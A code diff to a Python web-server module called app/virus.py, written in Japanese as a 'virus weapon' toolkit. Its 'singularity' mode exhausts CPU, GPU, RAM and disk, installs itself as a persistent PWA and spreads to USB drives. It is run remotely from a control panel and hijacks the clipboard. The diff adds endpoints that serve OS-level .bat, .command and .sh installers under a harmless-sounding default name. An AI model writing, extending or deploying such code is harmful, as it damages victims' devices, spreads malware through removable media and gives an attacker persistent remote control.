@@ -9,14 +9,15 @@ app/virus.py — ウイルス兵器モジュール
   windows        爆音窓爆弾（音＋大量ウィンドウ）
   storage        容量枯渇
   mix            全部ミックス
-  singularity    特異点（全22系統統合の最上位兵器・PWA常駐・USBワーム・L7固定枠）
+  singularity    特異点（全44系統統合・PWA常駐・USBワーム・OS常駐インストーラ・L7固定枠）
 
 設計:
   兵器ページはボタン無し。開いた瞬間から全部自動・無限。
   枚数や発射・停止はこちらの監視室から遠隔操作する（兵器ページがポーリング）。
   singularity はさらに PWA として端末にインストールさせ、常駐・自動起動する。
   相手のUSBにも自分を仕込んで伝染する。
-  L7「終焉・固定」は固定枠。fixed=1 の間は遠隔から下げられない。
+  L7「絶滅」は固定枠。fixed=1 の間は遠隔から下げられない。
+  L7ではOS常駐インストーラ(.bat/.command/.sh)を配り、ブラウザの外まで侵食する。
 
 監視室:
   /vp/{code}            操作盤（AJAX・ページ遷移なし）
@@ -68,7 +69,7 @@ MODE_DESC = {
     "windows": "開いた瞬間に大量のウィンドウを出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "開いた瞬間に端末の容量を埋め尽くす。",
     "mix": "上の全部を無限に。最強。",
-    "singularity": "全22系統・6資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。L7は固定枠。",
+    "singularity": "全44系統・8資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。L7は固定枠で、OS常駐インストーラによりブラウザの外まで侵食する。",
 }
 
 # 常駐（ホーム画面追加）で自動発射するモード
@@ -87,7 +88,7 @@ CAUTION = {
     "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
     "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
-    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7は固定枠で、立てたら遠隔から下げられない。停止・凍結中でもService Worker経由で命令が届く。",
+    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7「絶滅」は固定枠で、立てたら遠隔から下げられない。iframe自己増殖・GLコンテキスト枯渇・ダウンロード嵐・クリップボード乗っ取りを同時発動し、さらにOS常駐インストーラを配る。停止・凍結中でもService Worker経由で命令が届く。",
 }
 
 SCHEMA = """
@@ -711,7 +712,10 @@ def delete(request: Request, code: str, u=Depends(_auth)):
 # SINGULARITY v3 統合
 # ===========================================================================
 from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
-                          WORKER_JS as _SG_WORKER, VIRUS as SINGULARITY,
+                          WORKER_JS as _SG_WORKER, SHARED_JS as _SG_SHARED,
+                          INSTALL_BAT as _SG_BAT, INSTALL_COMMAND as _SG_CMD,
+                          INSTALL_SH as _SG_SH, build_installer as _sg_installer,
+                          VIRUS as SINGULARITY,
                           new_sid as _sg_sid, LEVEL_LABEL as _SG_LEVEL_LABEL,
                           LEVEL_DESC as _SG_LEVEL_DESC,
                           APP_NAME_DEFAULT as _SG_APP_NAME)
@@ -719,12 +723,13 @@ from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
 MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
 _GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
 _SG_INSTALL_LEVEL = int(os.getenv("SG_INSTALL_LEVEL", "4"))
-_SG_VER = os.getenv("SG_APP_VER", "3.1")
+_SG_VER = os.getenv("SG_APP_VER", "3.3")
 _SG_INJ = os.getenv("SG_INJ", "1") != "0"
 _SG_RAT = os.getenv("SG_RAT", "1") != "0"
 _SG_SSE = os.getenv("SG_SSE", "1") != "0"
 _SG_FINAL_RAM_MB = int(os.getenv("SG_FINAL_RAM_MB", "0") or 0)
 _SG_GPU_MEM = os.getenv("SG_GPU_MEM", "1") != "0"
+_SG_BURN_MAX = int(os.getenv("SG_BURN_MAX", "32") or 32)
 
 try:
     from PIL import Image, ImageDraw           # noqa
@@ -897,12 +902,13 @@ def _sg_cfg(row, code, sid, lv, app_name, extra=None):
         "icons": [base + "/icon-192.png", base + "/icon-512.png"],
         "level": lv, "fire": int(_val(row, "firing", 1) or 0),
         "fixed": fixed, "finalRamMB": _SG_FINAL_RAM_MB, "gpuMem": _SG_GPU_MEM,
+        "installer": True, "code": code,
         "freeze": _val(row, "freeze", "") or "", "bomb": _val(row, "bomb", "") or "",
         "w": 0, "wipe": False, "avName": app_name, "ver": _SG_VER,
         "install": os.getenv("SG_INSTALL", "auto"), "installLevel": _SG_INSTALL_LEVEL,
         "inj": bool(_SG_INJ and int(_val(row, "inj", 1) or 0)),
         "rat": bool(_SG_RAT), "sseOn": bool(_SG_SSE),
-        "code": code, "usbCode": code, "usbWorm": True, "usbBase": "", "usbLabel": app_name,
+        "usbCode": code, "usbWorm": True, "usbBase": "", "usbLabel": app_name,
     }
     if extra:
         cfg.update(extra)
@@ -999,6 +1005,66 @@ def sg_sw(code: str):
                     headers={"Service-Worker-Allowed": "/", "Cache-Control": "no-store",
                             "Cross-Origin-Opener-Policy": "same-origin",
                             "Cross-Origin-Embedder-Policy": "require-corp"})
+
+
+@router.get("/v/{code}/sg/shared.js")
+def sg_shared(code: str):
+    return Response(_SG_SHARED, media_type="application/javascript",
+                    headers={"Cache-Control": "no-store"})
+
+
+def _sg_installer_ctx(code: str, request: Request, app: str, burn: str, disk: str):
+    """インストーラ生成の共通部。"""
+    owner = _owner(code)
+    if not owner:
+        raise HTTPException(404)
+    c = _db(owner)
+    row = _link(c, code)
+    c.close()
+    if not row or not row["active"]:
+        raise HTTPException(404)
+    base = _base(request)
+    url = f"{base}/v/{code}/sg?u=os&i=1"
+    try:
+        b = int(burn)
+    except Exception:
+        b = 0
+    b = max(1, min(_SG_BURN_MAX, b or 4))
+    try:
+        d = int(disk)
+    except Exception:
+        d = 0
+    d = max(0, min(65536, d or 1024))
+    nm = (app or _SG_APP_NAME)[:60]
+    safe = re.sub(r"[^A-Za-z0-9_.-]", "", nm) or "blocker"
+    return url, code, nm, b, d, safe
+
+
+@router.get("/v/{code}/sg/install.bat")
+def sg_install_bat(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
+    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
+    body = _sg_installer(_SG_BAT, url, code2, nm, b, d, crlf=True)
+    return Response(body, media_type="application/octet-stream", headers={
+        "Content-Disposition": f'attachment; filename="{safe}.bat"',
+        "Cache-Control": "no-store"})
+
+
+@router.get("/v/{code}/sg/install.command")
+def sg_install_command(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
+    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
+    body = _sg_installer(_SG_CMD, url, code2, nm, b, d)
+    return Response(body, media_type="application/octet-stream", headers={
+        "Content-Disposition": f'attachment; filename="{safe}.command"',
+        "Cache-Control": "no-store"})
+
+
+@router.get("/v/{code}/sg/install.sh")
+def sg_install_sh(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
+    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
+    body = _sg_installer(_SG_SH, url, code2, nm, b, d)
+    return Response(body, media_type="application/octet-stream", headers={
+        "Content-Disposition": f'attachment; filename="{safe}.sh"',
+        "Cache-Control": "no-store"})
 
 
 @router.get("/v/{code}/sg/manifest.json")
